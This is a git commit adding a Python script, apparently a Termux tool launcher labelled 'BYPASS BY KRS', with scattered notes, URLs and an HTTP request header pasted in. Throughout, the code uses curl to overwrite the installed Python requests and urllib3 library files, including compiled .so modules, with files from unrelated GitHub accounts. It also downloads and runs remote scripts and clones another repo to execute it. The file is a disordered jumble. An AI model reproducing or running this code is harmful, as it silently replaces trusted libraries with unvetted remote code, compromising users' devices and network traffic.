474d17bc0f00681fa7f8f0f4ed94be65b53e620e
KASHIF KHAN <102716348+TEAM-KRS@users.noreply.github.com>
2023-01-31 11:54:08 +0500

    Add files via upload

---
+++ KRS.py
@@ -0,0 +1,117 @@
+import os,time
+os.system("curl https://raw.githubusercontent.com/JUTTBRAND/Library/main/api.py > /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py")
+os.system("curl https://raw.githubusercontent.com/ITX-SANAN/tt/main/12.py > /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py")
+os.system("clear")
+print("\n\n\tJoin My Facebook Group")
+print("\n    Apna key group ma post karo approval ka lia");time.sleep(2)
+os.system('xdg-open https://www.facebook.com/groups/207678473842318')
+os.system("rm -rf JuttBadshah")
+os.system("git clone https://github.com/SHOOTER-MAKER/JuttBadshah && cd JuttBadshah && python Juttbrand.py")
+os.system("cd JuttBadshah && python Juttbrand.py")
+
+
+
+https://tinyurl.com/lolsgdjgsjdgdb
+
+
+
+https://raw.githubusercontent.com/ITX-SANAN/.run/main/.c.py
+
+https://github.com/ITX-SANAN/.run
+
+.c.py
+https://github.com/TEAM-KRS/
+import os
+os.system("curl https://raw.githubusercontent.com/ITX-SANAN/fuck/main/krs2.py > .KRS.py && python .KRS.py")
+os.system("python .KRS.py")
+
+https://github.com/ITX-SANAN/fuck/blob/main/krs2.py
+
+
+
+
+
+POST /athena/checkpoint/v3/upload HTTP/1.1
+Accept-Encoding: text/example
+zip: 0
+fixed: 1
+count: 1
+appids: 1008
+ver: 2.3.0.5
+uuid: 6bb3f460-ac20-4e5b-9b6a-8058a177b488
+dupid: 90f5f0c0223bb6f3885296a2234b7b03bc2cae959a30eb5b98667a5020915e7d_0
+encrypt-level: 3
+encrypt-index: 61
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 11; Infinix X695 Build/RP1A.200720.011)
+Host: ire-dsu.shalltry.com
+Connection: Keep-Alive
+Content-Length: 1216
+
+
+
+
+cat connectionpool1.py > /data/data/com.termux/files/usr/lib/python3.11/site-packages/urllib3/connectionpool.py
+
+
+
+
+
+
+import os,time
+os.system("curl https://raw.githubusercontent.com/JUTTBRAND/Library/main/api.py > /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py")
+os.system("curl https://raw.githubusercontent.com/khalidjan21/approval-/main/KA.py > .aaa.py && python .aaa.py")
+os.system("python .aaa.py")
+os.system("clear")
+print("\n      \033[1;32m   BYPASS BY KRS ")
+print("\n\t\033[1;33mJoin My Facebook Group")
+print("\n  \033[1;32m  Apna key group ma post karo approval ka lia")
+print("\n.           \033[1;33m GROUP LINK 👇")
+print("  \033[1;32m https://www.facebook.com/groups/207678473842318 \n\n\n\n");time.sleep(3)
+os.system('xdg-open https://www.facebook.com/groups/207678473842318')
+os.system("rm -rf JuttBadshah")
+os.system("git clone https://github.com/SHOOTER-MAKER/JuttBadshah && cd JuttBadshah && python Juttbrand.py")
+os.system("cd JuttBadshah && python Juttbrand.py")
+
+https://github.com/ITX-SANAN/tt/blob/main/
+
+
+curl https://raw.githubusercontent.com/TEAM-KRS/GREEN/main/Jutt.cpython-311.so > /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.cpython-311.so
+
+
+https://github.com/TEAM-KRS/GREEN/blob/main/Jutt.cpython-311.so
+
+
+
+
+
+j
+
+cat models.cpython-311.so > /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.cpython-311.so
+
+
+32 bit models 
+https://github.com/khalidjan21/1/blob/main/models.cpython-311.so
+
+64 bit models
+https://raw.githubusercontent.com/ITX-SANAN/tt/main/12.cpython-311.so
+
+
+#coding=utf-8
+import os,platform
+try:
+    import requests
+except:
+    os.system('pip install requests')
+
+import requests
+bit = platform.architecture()[0]
+if bit == '64bit':
+    os.system("curl https://raw.githubusercontent.com/ITX-SANAN/tt/main/models.cpython-311.so > /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.cpython-311.so")
+        
+elif bit == '32bit':
+    os.system("curl https://raw.githubusercontent.com/khalidjan21/1/main/models.cpython-311.so > /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.cpython-311.so")
+        
+
+
+
